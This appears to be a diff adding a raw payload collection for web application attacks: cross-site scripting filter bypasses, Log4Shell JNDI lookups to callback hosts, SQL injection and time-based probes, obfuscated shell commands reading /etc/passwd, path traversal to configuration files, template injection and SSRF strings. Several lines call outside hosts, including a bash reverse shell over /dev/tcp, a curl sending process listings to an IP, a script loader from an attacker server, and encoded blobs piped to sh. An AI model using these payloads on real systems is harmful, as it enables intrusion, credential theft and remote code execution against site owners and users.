+<a href=ja%26Tab%3bvasc%26Tab%3bript:prompt`1`>pwn</a>
+<details+/'on+/ontoggle=1^confirm(document.domain)+open//
+"<sVg/onfake=""x=y""oNload=;1^(co\u006efirm)``^1//"
+"<img src=1 href=1 onerror=""javascript:alert('HEJAP ZAIRY AL-SHARIF')""></img>"
+"""><sc<>ript><onxXxxXXxXXXxx=()%20autofoco%20onmouseover=alert(""HEJAP ZAIRY AL-SHARIF"")></scr<>ipt>"
+t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+"""><svg%20onload=alert%26%230000000040""mysanismine"")>"
+"%00""><img src=x onerror=alert`1`//"
+<iframe+/ON+onload=%20alert(/str0d/)>
+"""<a href=""""/*"""">*/)});function+__MobileAppList(){alert(1)}//>"""
+"${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://xxx.dnslog.cn}"
+"${jndi${123%25ff:-}:ldap://xxx.dnslog.cn}"
+<h1/%6f%6e/oNclicK=alert``>XSS
+<svg/%6f%6e/oNloaD=alert``>
+"${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}}"
+%27/**/%256fR/**/50%2521%253D22%253B%2523
+"0%20/*!union*/%20/*!select*/%201
+"<svg onpointerenter=jQuery.globalEval(""al""+""ert(documen""+""t.cooki""+""e)"");>"
+<svg onload=alert&#0000000040document.cookie)>
+<img+src=x+on<!--ram-->error=ale<!--ram-->rt(1)>
+<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>
+"""firstname"":""<img src ='""
+"""><a/\test=""%26quot;x%26quot;""href='%01javascript:/*%b1*/;location.assign(""//hackerone.com/stealthy?x=""+location)'>Click"
+"""><img src=1 onmouseleave=print()>"
+""" on<embed>click=""a=al<embed>ert
+%27%09);%0d%0a%09%09[1].find(alert)//
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+"test""
+"/*!50000and*/ /*!50000extractvalue*/(0x0a
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+<ifram%0de src=jav%0dascript:alert(document.cookie)>
+-setTimeout`prompt\u0028document.domain\u0029`-'
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+“><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>
+<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
+“><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/“^1//
+<x/onclick=globalThis&lsqb;’\u0070r\u006f’+’mpt’]&lt;)>clickme
+\/><img src=x onerror=”a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)”>
+-1′ and .0union+distinct+select+1+–+
+qaramany'%2buser_name(@@version)--
+1%27/** /%256FR/** /50%2521%253D22%253B%2523
+%2522%252B%254F%2552%252B%2531%2521%253D%2537%2523
+"1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’)))
+printf dW5hbWUgLWE= | base64 -d | sh
+target[.]com/download?url=[shortened link of http://ssrfip/download?url=file:///etc/passwd]
+"; /b'i'n\/?at /e't'c\/\pa??\wd"
+"a=ca;b=t;$a$b /et*/p*s*wd"
+"$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)"
+"cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??"
+"<xhzeem attr="" --- x=""=='='onmouseover=confirm`xhzeem` style=""display:block;width:1000px;height:1000px;background:red""> --- "">"
+"""><sVg/OnLuFy=""X=y""oNloaD=;1^confirm(1)>/``^1//"
+"""><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>"
+"cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??"
+"%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)"
+"""><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>"
+"-1' and .0union+distinct+select+1+--+"
+"""><p only=1337 onmouseenter=window.location.href=//attacker.site>"
+"<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>"
+"%3CF5%3E/strrr/821}+union+%23%0a+distinctrow%0b/**/select+1
+"??""><img/src/onerror=alert(document.domain)>"
+"<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>"
+"<sVg %00%00%00//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>"
+"${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}"
+"parameter=<svg/&parameter=onload=alert()>"
+"""/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd /cgi-bin/.%2%65/.%2%65/.%2%65/.%2%65/etc/passwd /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+"org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(""uname -a"").getInputStream())"
+"<details onauxclick=confirm`xss`></details>"
+"<svg onload=alert&#0000000040""1"")>"
+"<a data-orig-ref="" alert(1)"" data-orig-proto=""javascript"" href=""javascript:// alert(1)"">clickme</a>"
+"javas%09cript:ghi=%27)%3E%27
+"""${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\'
+"’%2buser_name(convert(int
+"“autofocus onclick=’&#97;lert()’"
+"“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’"
+"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">"
+"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
+"xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>"
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27
+php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
+cat /???/??ss??
+cat /e??/p????? 
+"[""');alert('xss');//""]@xyz.xxx"
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+"<c/onpointerrawupdate=d=document
+"echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo ""U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM="" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh"
+<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�
+autofocus ' onfocus='alert(document.domain)'
+"""autofocus onfocus='alert(document.domain)' "
+%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+"""') AND (updatexml(1
+"f'1) UNION SELECT 1
+action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b)
+%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/)
+1%20AND%20(SELECT%209312%20FROM%20(SELECT(SLEEP(5)))hYkP
+../../../wp-config.php 
+111+AND+(SELECT+5926+FROM+(SELECT(SLEEP(5)))erUA) 
+1&a%2522%253e%253cscript%253ealert%2528/xss/%2529%253c%252fscript%253e
+%3Cscript%3Ealert(`xss`)%3C/script%3E
+"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>"
+/???/???/c?t$IFS/???/p?s?w?
+"<!DOCTYPE foo [<!ENTITY % a ""&#x3c;&#x21; ... omitted ..."
+"{""sku"":""a\"" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}"
+"><BODy onbeforescriptexecute=""x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"">"
+"<a href=""http://example.com;"" onmouseover=""z=top;z[/al/.source%2b/ert/.source](8);//test.com/"""
+<svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>
+http://example.com%22%3E%3Csvg%3E%3Cimage%20xlink:href=%22path/to/image.jpg%22%20onerror=confirm(document.location)%3E
+<img src onerror=%26emsp;prompt`${document.domain}`>
+"testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])"
+"{{var this.getTemplateFilter().addAfterFilterCallback(""system"").filter(""whoami"")}}"
+"SELECT * FROM test WHERE id = 1 WAITFOR DELAY'0:0:5'"
+"////evil%E3%80%82com"
+"-16'and@:="
+"""><svg%20onload=alert%26%230000000040""1"")>"
+dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi
+"javas%09cript:ghi=%27)%3E%27
+&lt;script&gt;
+"null /*!12345union*/ select 1
+"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;"
+"<=script>=alert(""hacked"")<=/scirpt>="
+"services.logging.getLogger(""foo"").error(""Job content executed"")"
+/api/system/debug/support/bundle/download/{filename}
+<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
+%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D
+javascript%3Avar%20a%3D%22ale%22%3Bvar%20b%3D%22rt%22%3Bvar%20c%3D%22%28%29%22%3BdecodeURI%28%22%26lt%3Bbutton%20popovertarget%3Dx%26gt%3BClick%20me%26lt%3B%2Fbutton%26gt%3B%26lt%3Bhvita%20onbeforetoggle%3D%22%2Ba%2Bb%2Bc%2B%22%20popover%20id%3Dx%26gt%3BHvita%26lt%3B%2Fhvita%26gt%3B%22%29
+../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml
+%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D
+&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;
+&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt%2Ca(origin)%20x&gt;
+(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+
+curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60
+"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;"
+"&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt
